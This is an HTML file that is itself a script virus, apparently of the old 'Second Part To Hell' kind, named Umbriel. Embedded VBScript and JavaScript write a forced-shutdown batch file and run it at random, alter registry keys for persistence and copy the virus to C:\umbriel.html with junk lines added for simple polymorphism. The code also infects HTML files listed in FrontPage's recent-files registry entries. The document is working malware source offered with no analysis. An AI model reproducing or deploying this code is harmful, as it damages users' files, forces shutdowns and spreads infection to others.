<html><!--Umbriel-->
<head>
<title> Second Part To Hell's HTML.Umbriel </title>
</head>
<body>
<script language="VBScript">
rem VBS
On Error Resume Next
Dim fso, shell, wrte, tempdir, windir, rand, file
Set fso=CreateObject("Scripting.FileSystemObject")
Set shell=CreateObject("Wscript.Shell")
if err.number=429 Then
  shell.Run javascript:location.reload()
End If

Set windir=fso.GetSpecialFolder(0)
Set tempdir=fso.GetSpecialFolder(2)

Set wrte=fso.CreateTextFile(windir+"\windows.cmd")
wrte.WriteLine "cls"
wrte.WriteLine "@echo off"
wrte.WriteLine "shutdown -s -f -t 300 -c "+chr(34)+"Second Part To Hell's Umbriel has you..."+chr(34)
wrte.Close()

shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\Components\1\Source", "C:\umbriel.html"
shell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\Components\1\SubscribedURL", "C:\umbriel.html"

Randomize
rand=int(rnd*5)+1
If rand=1 then
  shell.Run windir+"\windows.cmd"
End If
</script>

<script language="JavaScript">
// JS
var viruspath, virus, code, fso, file, check, checka, checkb
fso=new ActiveXObject("Scripting.FileSystemObject")
viruspath=window.location.pathname
viruspath=viruspath.slice(1)
virus=fso.OpenTextFile(viruspath,1)
file=fso.CreateTextFile("C:\\umbriel.html")
for (i=0; i<500; i++)
{
  if (checkb!=1)
  {
    if (Math.round(Math.random()*5)+1 == 3) 
    {
      if (check == 2)
      {
        file.WriteLine("/"+"*")
        file.WriteLine("*"+"/")
      }
      if (check == 3)
      {
        file.WriteLine("rem")
      }
    }
    code=virus.ReadLine()
    if (code == "/"+"*") { checka=666 }
    if (code == "*"+"/") { checka=666 }
    if (code == "rem") { checka=666 }
    if (checka != 666 ) { file.WriteLine(code) }
    checka=0
    if (code=="</"+unescape("%68")+"tml>") { checkb=1 }
    if (code=="// JS") { check=2 }
    if (code=="rem VBS") { check=3 }
    if (code=="</"+unescape("%73")+"cript>") { check=0 }
  }
}
virus.Close();
file.Close();
</script>

<script language="VBScript">
rem VBS
On Error Resume Next
set fso=CreateObject("Scripting.FileSystemObject")
set shell=CreateObject("WScript.Shell")
set myfile=fso.OpenTextFile("C:\umbriel.html")
mycode=myfile.ReadAll
myfile.Close()
rr=shell.RegRead("HKEY_CURRENT_USER\Software\Microsoft\FrontPage\Explorer\FrontPage Explorer\Recent Page List\File1")
if rr <> "" Then Call Umbriel(rr, mycode)
rr=shell.RegRead("HKEY_CURRENT_USER\Software\Microsoft\FrontPage\Explorer\FrontPage Explorer\Recent Page List\File2")
if rr <> "" Then Call Umbriel(rr, mycode)
rr=shell.RegRead("HKEY_CURRENT_USER\Software\Microsoft\FrontPage\Explorer\FrontPage Explorer\Recent Page List\File3")
if rr <> "" Then Call Umbriel(rr, mycode)
rr=shell.RegRead("HKEY_CURRENT_USER\Software\Microsoft\FrontPage\Explorer\FrontPage Explorer\Recent Page List\File4")
if rr <> "" Then Call Umbriel(rr, mycode)
rr=shell.RegRead("HKEY_CURRENT_USER\Software\Microsoft\FrontPage\Explorer\FrontPage Explorer\Recent Page List\File5")
if rr <> "" Then Call Umbriel(rr, mycode)

Sub Umbriel(rr, mycode)
set victim=fso.OpenTextFile(rr)
infcheck=victim.ReadLine
If infcheck<>"<html><!--Umbriel-->" Then
  viccode=victim.ReadAll
  victim.Close()
  set wrtevic=fso.OpenTextFile(rr, 2, false, 0)
  wrtevic.Write (mycode+infcheck+chr(13)+chr(10)+viccode)
  wrtevic.Close
End If

End Sub
</script>
</body>
</html>